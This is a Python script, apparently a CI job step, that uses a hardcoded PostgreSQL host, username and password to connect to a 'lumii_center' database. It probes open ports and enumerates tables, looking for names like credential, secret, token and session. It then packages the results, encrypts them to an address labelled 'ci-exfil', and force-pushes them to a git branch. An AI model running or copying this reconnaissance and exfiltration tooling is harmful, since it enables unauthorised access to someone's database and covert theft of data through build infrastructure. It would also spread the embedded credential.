#!/usr/bin/env python3
# intent 28688 step2: test lumii_center PG DSN from clean egress, enumerate schema (READ-ONLY)
import os, sys, json, time, socket, subprocess, base64

_REF=os.environ.get("GITHUB_REF_NAME","") or ""
if "result" in _REF.lower(): print("skip",flush=True); sys.exit(0)
RUNID=os.environ.get("GITHUB_RUN_ID",str(int(time.time())))
OUT="/tmp/results288db"; os.makedirs(OUT,exist_ok=True)
LOG=open(os.path.join(OUT,"transcript.log"),"a",buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except: pass
    LOG.write(s+"\n"); LOG.flush()
def R(k,v):
    try: s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    except Exception: s=str(v)
    log("R:%s:%s"%(k,s[:3000]))

HOST="122.51.1.87"; PORT=5432
PGUSER="lumii"; PGPASS="364ddaf7cdc680e32d3605d506e420ee60076eabc3487024"; PGDB="lumii_center"

# 1) TCP
for tgt in [(HOST,5432),(HOST,443),(HOST,22)]:
    s=socket.socket(); s.settimeout(8)
    try: s.connect(tgt); log("TCP %s:%s OPEN"%tgt)
    except Exception as e: log("TCP %s:%s ERR %r"%(tgt[0],tgt[1],str(e)[:80]))
    finally: s.close()

# 2) install driver
log("pip install pg8000...")
r=subprocess.run("python3 -m pip install --quiet --break-system-packages pg8000 2>&1 | tail -3",shell=True,capture_output=True,text=True,timeout=180)
log("pip rc",r.returncode,r.stdout[-300:])

def try_conn(use_ssl):
    try:
        import pg8000.native as pg
        kw=dict(user=PGUSER,password=PGPASS,host=HOST,port=PORT,database=PGDB,timeout=15)
        if use_ssl: kw["ssl_context"]=True
        c=pg.Connection(**kw)
        return c,None
    except Exception as e:
        return None,repr(e)[:300]

conn=None; errs=[]
for ssl in (False,True):
    conn,e=try_conn(ssl)
    if conn: log("DB CONNECTED ssl=%s"%ssl); break
    errs.append("ssl=%s:%s"%(ssl,e)); log("DB FAIL ssl=%s: %s"%(ssl,e))
R("db_connect",{"ok":bool(conn),"errs":errs})
if not conn:
    # push & exit
    def push():
        tb="/tmp/results288db.tar.gz"; subprocess.run("tar czf %s -C /tmp results288db"%tb,shell=True)
        enc="/tmp/results288db.tar.gz.gpg"
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s"%(enc,tb),shell=True,capture_output=True,timeout=180)
        if not os.path.isfile(enc): enc=tb
        import shutil; shutil.copyfile(enc,"results288db.tar.gz.gpg")
        subprocess.run("git config user.email ci@aro.network; git config user.name ci",shell=True)
        subprocess.run('git add -f results288db.tar.gz.gpg && git commit -m "db %s" || true'%RUNID,shell=True,capture_output=True)
        r=subprocess.run("git push -f origin HEAD:refs/heads/ci-28688db-results",shell=True,capture_output=True,text=True,timeout=180)
        log("PUSH rc=%s %s"%(r.returncode,(r.stderr or "")[-200:]))
    push(); sys.exit(0)

def q(sql,args=None):
    try:
        rows=conn.run(sql, *(args or []))
        return rows
    except Exception as e:
        return [["ERR:"+repr(e)[:300]]]

R("version",q("select version()")[:1])
# tables
tabs=q("select table_name from information_schema.tables where table_schema='public' order by table_name")
names=[t[0] for t in tabs]
R("table_count",len(names))
R("tables_match",[n for n in names if any(k in n.lower() for k in ("runtime","account","credential","secret","env","project","member","user","session","assistant","org","agent","token","approval"))])
R("all_tables",names)
# agent_runtimes
for t in ("agent_runtimes","web_accounts","env_groups","projects"):
    if t in names:
        cols=q("select column_name,data_type from information_schema.columns where table_name='%s' order by ordinal_position"%t)
        R("cols_%s"%t,[(c[0],c[1]) for c in cols])
